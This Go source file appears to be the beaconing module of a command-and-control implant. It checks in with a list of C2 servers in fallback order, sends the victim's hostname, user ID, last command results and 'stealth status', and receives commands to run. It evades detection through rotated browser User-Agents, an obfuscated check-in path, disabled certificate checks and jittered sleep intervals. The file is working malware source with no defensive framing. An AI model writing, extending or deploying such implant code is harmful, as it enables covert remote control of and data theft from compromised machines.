package ttp

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"core/mon/internal/config"
	"core/mon/internal/obf"
	"core/mon/internal/protocol"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
}

// BeaconAny tries each endpoint in order and returns the command from the first
// that succeeds. Also returns the active endpoint so the caller can track which
// server is reachable (R-05: C2 fallback chain).
//
// If all endpoints fail, the last error is returned.
func BeaconAny(endpoints []string, agentID string, lastTTP int, lastResult, lastError string, env *protocol.EnvReport) (*protocol.Command, string, error) {
	var lastErr error
	for _, ep := range endpoints {
		cmd, err := beacon(ep, agentID, lastTTP, lastResult, lastError, env)
		if err == nil {
			return cmd, ep, nil
		}
		lastErr = err
	}
	return nil, "", lastErr
}

// Beacon performs a single check-in cycle and returns the server's command.
// Deprecated: use BeaconAny for fallback support. Kept for internal use.
func Beacon(serverAddr, agentID string, lastTTP int, lastResult, lastError string) (*protocol.Command, error) {
	cmd, _, err := BeaconAny([]string{serverAddr}, agentID, lastTTP, lastResult, lastError, nil)
	return cmd, err
}

// beacon performs a single check-in to the given endpoint.
func beacon(serverAddr, agentID string, lastTTP int, lastResult, lastError string, env *protocol.EnvReport) (*protocol.Command, error) {
	hostname, _ := os.Hostname()

	checkin := protocol.CheckIn{
		AgentID:       agentID,
		Hostname:      hostname,
		OS:            "linux",
		Arch:          "amd64",
		UID:           os.Getuid(),
		LastTTP:       lastTTP,
		LastResult:    lastResult,
		LastError:     lastError,
		Token:         protocol.GenerateToken(config.SharedSecret, agentID),
		Env:           env,
		StealthStatus: LocalStealthStatus(), // live sysfs read   survives server restart
	}

	body, err := protocol.Encode(checkin)
	if err != nil {
		return nil, fmt.Errorf("encode: %w", err)
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	url := fmt.Sprintf("https://%s%s", serverAddr, obf.D(obf.CheckinPath))
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("new request: %w", err)
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Agent-ID", agentID)
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http post: %w", err)
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, _ = buf.ReadFrom(resp.Body)

	var cmd protocol.Command
	if err := protocol.Decode(buf.Bytes(), &cmd); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return &cmd, nil
}

// JitteredSleep sleeps for interval +/- jitter*interval.
func JitteredSleep(interval time.Duration, jitter float64) {
	delta := time.Duration(float64(interval) * jitter * (2*rand.Float64() - 1))
	time.Sleep(interval + delta)
}
